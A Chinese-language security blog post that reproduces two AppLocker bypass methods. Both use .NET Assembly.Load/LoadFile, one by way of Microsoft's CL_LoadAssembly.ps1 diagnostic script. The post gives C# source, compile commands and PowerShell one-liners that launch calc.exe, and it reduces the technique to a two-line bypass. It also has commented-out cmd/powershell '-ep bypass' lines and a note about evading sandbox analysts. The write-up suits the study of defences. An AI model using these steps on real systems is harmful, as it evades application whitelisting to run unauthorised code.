---
layout: post
title: 利用Assembly Load & LoadFile绕过Applocker的分析总结
---


## 0x00 前言
---

最近bohops在文章[《Executing Commands and Bypassing AppLocker with PowerShell Diagnostic Scripts》](https://bohops.com/2018/01/07/executing-commands-and-bypassing-applocker-with-powershell-diagnostic-scripts/)中介绍了利用CL_LoadAssembly.ps1绕过Applocker的方法，Casey Smith早在SchmooCon 2015也提到了这个方法。本文将要对他们的两个实现方法进行复现，分析细节，比较区别，进而总结利用思路。

## 0x01 简介
---

本文将要介绍以下内容：

- 复现bohops的方法
- 复现Casey Smith的方法
- 细节分析
- 总结利用思路

## 0x02 复现bohops的方法
---

测试系统： Win7 x86

开启Applocker，开启方法可参考文章《Bypass Windows AppLocker》

开发工具: VS2012

1、新建c#控制台工程ConsoleApplication5，默认代码如下：

```
using System;
using System.Collections.Generic;
using System.Text;

namespace ConsoleApplication5
{
    class Program
    {
        static void Main(string[] args)
        {
        }
    }
}
```

2、修改代码，内容如下：

```
namespace ConsoleApplication5
{
    public class Program
    {
        public static void test()
        {
            System.Diagnostics.Process p = new System.Diagnostics.Process();
            p.StartInfo.FileName = "c:\\windows\\system32\\calc.exe";
//            p.StartInfo.FileName = "c:\\windows\\system32\\cmd.exe";
//            p.StartInfo.Arguments = @"/c ""powershell.exe"" -ep bypass -c $host";   
            p.Start();
        }
        static void Main(string[] args)
        {
            test();
        }
        
    }
}
```

**注：**

`class Program`前需要添加访问修饰符`public`,添加Method test()同样要加访问修饰符`public`

3、修改目标框架为.net 2.0，编译生成ConsoleApplication5，保存在c:\6下

4、powershell执行如下代码：

```
cd C:\windows\diagnostics\system\AERO
import-module .\CL_LoadAssembly.ps1
LoadAssemblyFromPath ..\..\..\..\6\ConsoleApplication5.exe
[ConsoleApplication5.Program]::test()
```

**注：**

`..\..\..\..\`能够定位到`c:\`

`[ConsoleApplication5.Program]::test()`需要同程序内的代码对应，格式为：`[$namespace.$class]::$fuction()`

成功执行calc.exe，绕过applocker

## 0x03 复现Casey Smith的方法
---


测试系统： Win7 x86

开启Applocker

代码参考地址：

https://gist.github.com/netbiosX/5f19a3e8762b6e3fd25782d8c37b1663

本次测试对Casey Smith的代码做细微修改

1、新建文件bypass.cs，内容如下：

```
using System;
using System.Collections.Generic;
using System.Text;

public class Program
{
	public static void Main()
	{
		Console.WriteLine("Hey There From Main()");
		//Add any behaviour here to throw off sandbox execution/analysts :)
		
	}
	
}
public class aaa
 {
        public static void bbb()
        {
            System.Diagnostics.Process p = new System.Diagnostics.Process();
            p.StartInfo.FileName = "c:\\windows\\system32\\calc.exe";
//            p.StartInfo.FileName = "c:\\windows\\system32\\cmd.exe";
//            p.StartInfo.Arguments = @"/c ""powershell.exe"" -ep bypass -c notepad.exe";   
            p.Start();
        }
}
```

2、使用2.0版本的csc.exe对其编译，生成exe文件

```
C:\Windows\Microsoft.NET\Framework\v2.0.50727\csc.exe  /unsafe /platform:x86 /out:bypass.exe bypass.cs
```

3、powershell执行如下代码：

```
$bytes = [System.IO.File]::ReadAllBytes("C:\6\bypass.exe")
[Reflection.Assembly]::Load($bytes)
[aaa]::bbb()
```

成功执行calc.exe，绕过applocker

## 0x04 对比分析
---

### 1、bohops的方法

加载文件CL_LoadAssembly.ps1，位于`C:\windows\diagnostics\system\AERO`

文件CL_LoadAssembly.ps1内容如下：


```
# Copyright © 2008, Microsoft Corporation. All rights reserved.


# Common library
. .\CL_Utility.ps1

function LoadAssemblyFromNS([string]$namespace)
{
    if([string]::IsNullorEmpty($namespace))
    {
        throw "Invalid namespace"
    }

    [System.Reflection.Assembly]::LoadWithPartialName($namespace) > $null
}

function LoadAssemblyFromPath([string]$scriptPath)
{
    if([String]::IsNullorEmpty($scriptPath))
    {
        throw "Invalid file path"
    }

    $absolutePath = GetAbsolutionPath $scriptPath


[System.Reflection.Assembly]::LoadFile($absolutePath) > $null
}
```

调用函数`LoadAssemblyFromPath`，本质上是调用`[System.Reflection.Assembly]::LoadFile($absolutePath)`


### 2、Casey Smith的方法

```
$bytes = [System.IO.File]::ReadAllBytes("C:\6\bypass.exe")
[Reflection.Assembly]::Load($bytes)
[aaa]::bbb()
```

调用了`[Reflection.Assembly]::Load($bytes)`

**注：**

`[Reflection.Assembly]`是`[System.Reflection.Assembly]`的简写

### 3、对比

两种方法分别使用了Assembly的LoadFile和Load方法，两者的区别在这里的影响微乎其微

可以分别使用LoadFile和Load方法去调用以上两种方法生成的两个exe(分别由vs2012和csc.exe编译)

互换后的代码如下：


```
$bytes = [System.IO.File]::ReadAllBytes("C:\6\ConsoleApplication5.exe")
[Reflection.Assembly]::Load($bytes)
[ConsoleApplication5.Program]::test()
```


```
cd C:\windows\diagnostics\system\AERO
import-module .\CL_LoadAssembly.ps1
LoadAssemblyFromPath ..\..\..\..\6\bypass.exe
[aaa]::bbb()
```

经过以上测试，可以推断如下两段代码等价：

```
cd C:\windows\diagnostics\system\AERO
import-module .\CL_LoadAssembly.ps1
LoadAssemblyFromPath ..\..\..\..\6\bypass.exe
```

```
[Reflection.Assembly]::LoadFile("C:\6\bypass.exe")
```


依照以上推断，我们可以对Casey Smith的利用代码进行精简，最短的powershell实现代码如下：


```
[Reflection.Assembly]::LoadFile("C:\6\bypass.exe")
[aaa]::bbb()
```


### 4、适用条件

实际测试，以上两种方法适用.net 2.0，如果换成.net 4.0编译，在执行时会报错


## 0x05 小结 
---

本文分别对bohops和Casey Smith的方法做了测试，找到方法的本质是分别使用了Assembly的LoadFile和Load方法。经实际测试，得出该方法只适用于.Net 2.0环境


---


[LEAVE A REPLY](https://github.com/3gstudent/feedback/issues/new)


